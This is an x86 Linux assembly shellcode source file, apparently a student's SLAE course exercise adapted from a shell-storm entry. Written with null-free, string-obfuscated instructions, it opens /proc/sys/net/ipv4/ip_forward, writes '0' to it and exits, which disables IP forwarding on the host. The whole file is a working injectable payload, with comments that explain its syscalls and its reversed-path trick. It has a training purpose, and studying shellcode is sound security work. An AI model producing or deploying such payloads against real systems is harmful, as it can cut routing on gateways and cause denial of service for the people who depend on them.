; Student:   SLAE-755
; Linux/x86 - Set '/proc/sys/net/ipv4/ip_forward' to '0' & exit() 
; http://shell-storm.org/shellcode/files/shellcode-848.php

global _start			

section .text

_start:

	xor	eax,eax
	push	eax

	; python -c "print '\x64\x72\x61\x77\x72\x6f\x66\x5f\x70\x69\x2f\x34\x76\x70\x69\x2f\x74\x65\x6e\x2f\x2f\x73\x79\x73\x2f\x63\x6f\x72\x70\x2f'"
	; drawrof_pi/4vpi/ten//sys/corp/
	push	dword 0x64726177
	push	dword 0x726f665f
	push	dword 0x70692f34
	push	dword 0x7670692f
	push	dword 0x74656e2f
	push	dword 0x2f737973
	push	dword 0x2f636f72
	push	word 0x702f


	mov	ebx,esp
	xor	ecx,ecx
	mov	cl,0x1
	; #define __NR_open 5 syscall
	mov	al,0x5
	int	0x80


	mov	ebx,eax
	xor	ecx,ecx
	push	ecx
	push	byte +0x30
	mov	ecx,esp
	xor	edx,edx
	mov	dl,0x1
	; #define __NR_write 4
	mov	al,0x4
	int	0x80


	xor	eax,eax
	; #define __NR_close 6
	add	eax,byte +0x6
	int	0x80

	; exit() procedure
	xor	eax,eax
	inc	eax
	xor ebx,ebx
	int 0x80
